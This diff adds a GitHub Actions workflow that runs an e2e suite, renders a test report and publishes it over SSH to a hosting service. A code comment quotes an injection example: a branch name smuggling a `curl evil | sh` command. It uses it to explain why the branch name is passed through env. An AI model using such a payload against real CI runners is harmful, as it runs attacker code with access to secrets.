@@ -1,0 +1,178 @@
+name: e2e report (PR)
+
+# Publishes a browsable report for every pull request: results, plus whatever
+# screenshots the tests recorded, at one URL a reviewer can open on a phone.
+#
+# This file is INFRASTRUCTURE ONLY. It runs no tests of its own. It calls the
+# `e2e-ci` make target and does nothing when that target does not exist, so the
+# workflow can land before any test does and switch on the day one appears.
+# The contract it expects is in docs/E2E-REPORTS.md.
+on:
+  pull_request:
+
+concurrency:
+  group: e2e-report-${{ github.event.pull_request.number }}
+  cancel-in-progress: true
+
+permissions:
+  contents: read
+  pull-requests: write
+
+jobs:
+  report:
+    runs-on: ubuntu-latest
+    timeout-minutes: 25
+    env:
+      E2E_ARTIFACTS: ${{ github.workspace }}/artifacts
+      # Job level, not step level: the secrets context is rejected in a step's
+      # `if`, and a step's own env block is not visible to its own condition.
+      # Runner logs mask the value.
+      HOSTTHIS_SSH_KEY: ${{ secrets.HOSTTHIS_SSH_KEY }}
+
+    steps:
+      - uses: actions/checkout@v4
+
+      # The seam. Everything below is conditional on it, so this workflow is
+      # inert until someone adds the target.
+      - name: Look for the e2e-ci target
+        id: seam
+        run: |
+          if grep -qE '^e2e-ci:' Makefile; then
+            echo "present=true" >> "$GITHUB_OUTPUT"
+            echo "found the e2e-ci target"
+          else
+            echo "present=false" >> "$GITHUB_OUTPUT"
+            echo "no e2e-ci target in the Makefile; nothing to run"
+            echo "See docs/E2E-REPORTS.md for the contract." >> "$GITHUB_STEP_SUMMARY"
+          fi
+
+      - uses: actions/setup-go@v5
+        if: steps.seam.outputs.present == 'true'
+        with:
+          go-version: '1.26'
+          cache: true
+
+      # A failing suite is the case a report matters most for, so the result is
+      # recorded here and the job is failed at the very end instead.
+      - name: Run e2e
+        id: tests
+        if: steps.seam.outputs.present == 'true'
+        continue-on-error: true
+        run: |
+          mkdir -p "$E2E_ARTIFACTS"
+          make e2e-ci
+
+      # HEAD_REF arrives through env, never through ${{ }} interpolation. A
+      # branch name is attacker-controlled on a fork PR, and ${{ }} is
+      # substituted into the shell SOURCE before it runs, so interpolating it
+      # directly would let a branch named `a"; curl evil | sh; echo "` execute
+      # in the runner. Via env it is only ever a variable's value. The PR
+      # number is safe either way (an integer), but the reference stays here
+      # so the next editor sees which values are untrusted.
+      - name: Render report
+        if: always() && steps.seam.outputs.present == 'true'
+        env:
+          HEAD_REF: ${{ github.event.pull_request.head.ref }}
+        run: |
+          python3 scripts/render_test_report.py \
+            --junit results.xml \
+            --artifacts "$E2E_ARTIFACTS" \
+            --out report \
+            --title "hostthis e2e - PR #${{ github.event.pull_request.number }}" \
+            --commit "$GITHUB_SHA" \
+            --branch "$HEAD_REF" \
+            --pr "${{ github.event.pull_request.number }}" \
+            --repo "$GITHUB_REPOSITORY" \
+            --reproduce "make e2e-ci" \
+            --run-url "$GITHUB_SERVER_URL/$GITHUB_REPOSITORY/actions/runs/$GITHUB_RUN_ID"
+
+      - name: Upload artifacts
+        if: always() && steps.seam.outputs.present == 'true'
+        uses: actions/upload-artifact@v4
+        with:
+          name: e2e-report-pr${{ github.event.pull_request.number }}-${{ github.run_attempt }}
+          path: |
+            report/
+            artifacts/
+            results.xml
+          if-no-files-found: warn
+          retention-days: 30
+
+      # hostthis identifies an uploader by ssh key and refuses a keyless client,
+      # so publishing needs HOSTTHIS_SSH_KEY. Without it this is skipped, not
+      # failed, and the report still ships as a build artifact. Pull requests
+      # from forks never receive secrets, so they skip too.
+      - name: Publish report
+        id: publish
+        if: always() && steps.seam.outputs.present == 'true' && env.HOSTTHIS_SSH_KEY != ''
+        continue-on-error: true
+        env:
+          REPORT_NAME: "hostthis e2e PR #${{ github.event.pull_request.number }}"
+        run: |
+          install -m 700 -d ~/.ssh
+          printf '%s\n' "$HOSTTHIS_SSH_KEY" > ~/.ssh/hostthis
+          chmod 600 ~/.ssh/hostthis
+          hh() { ssh -T -i ~/.ssh/hostthis -o IdentitiesOnly=yes \
+                     -o StrictHostKeyChecking=accept-new -o ConnectTimeout=40 "$@"; }
+
+          # One slug per pull request, redeployed in place: the URL in the PR
+          # comment stays correct for the life of the branch, each run becomes a
+          # new version rather than a new paste, and stored bytes grow with the
+          # number of PRs instead of the number of pushes.
+          slug=$(hh hostthis.dev list -o json 2>/dev/null \
+                 | jq -r --arg n "$REPORT_NAME" 'map(select(.name==$n))[0].slug // ""' 2>/dev/null || true)
+          echo "existing slug for '$REPORT_NAME': ${slug:-<none>}"
+
+          # errexit is on by default here, so the pipeline must be shielded or
+          # the step dies before any diagnostic below it runs. stderr is kept:
+          # discarding it turns a real failure into a blank variable.
+          set +e
+          tar czf - -C report . | hh hostthis.dev $slug > upload.out 2> upload.err
+          rc=$?
+          set -e
+          echo "ssh exit: $rc"
+          echo "--- stdout ---"; head -c 500 upload.out || true
+          echo "--- stderr ---"; head -c 500 upload.err || true
+
+          url=$(grep -oE 'https://[a-z0-9]+\.hostthis\.dev' upload.out | head -1)
+          if [ -z "$url" ]; then
+            echo "upload produced no url"
+            exit 1
+          fi
+          if [ -z "$slug" ]; then
+            newslug=$(echo "$url" | sed -E 's|https://([a-z0-9]+)\..*|\1|')
+            hh hostthis.dev rename "$newslug" "$REPORT_NAME" || true
+          fi
+          echo "url=$url" >> "$GITHUB_OUTPUT"
+          echo "published $url"
+
+      - name: Comment the report link
+        # Forks get a read-only token, so this cannot post there. The job
+        # summary always carries the link.
+        if: always() && steps.publish.outputs.url != '' && github.event.pull_request.head.repo.full_name == github.repository
+        continue-on-error: true
+        env:
+          GH_TOKEN: ${{ github.token }}
+        run: |
+          gh pr comment "${{ github.event.pull_request.number }}" --body \
+            "e2e ${{ steps.tests.outcome }}: ${{ steps.publish.outputs.url }} (commit \`${GITHUB_SHA:0:8}\`)"
+
+      - name: Summary
+        if: always() && steps.seam.outputs.present == 'true'
+        run: |
+          {
+            echo "### e2e: ${{ steps.tests.outcome }}"
+            echo ""
+            echo "| field | value |"
+            echo "| --- | --- |"
+            echo "| report | ${{ steps.publish.outputs.url || 'not published; see the report artifact' }} |"
+            echo "| commit | \`${GITHUB_SHA:0:8}\` |"
+            echo "| screenshots | $(find "$E2E_ARTIFACTS" -name '*.png' 2>/dev/null | wc -l | tr -d ' ') |"
+          } >> "$GITHUB_STEP_SUMMARY"
+
+      # The suite's own result decides the job, after the report exists.
+      - name: Gate on the suite result
+        if: always() && steps.seam.outputs.present == 'true' && steps.tests.outcome != 'success'
+        run: |
+          echo "e2e failed; report: ${{ steps.publish.outputs.url }}"
+          exit 1
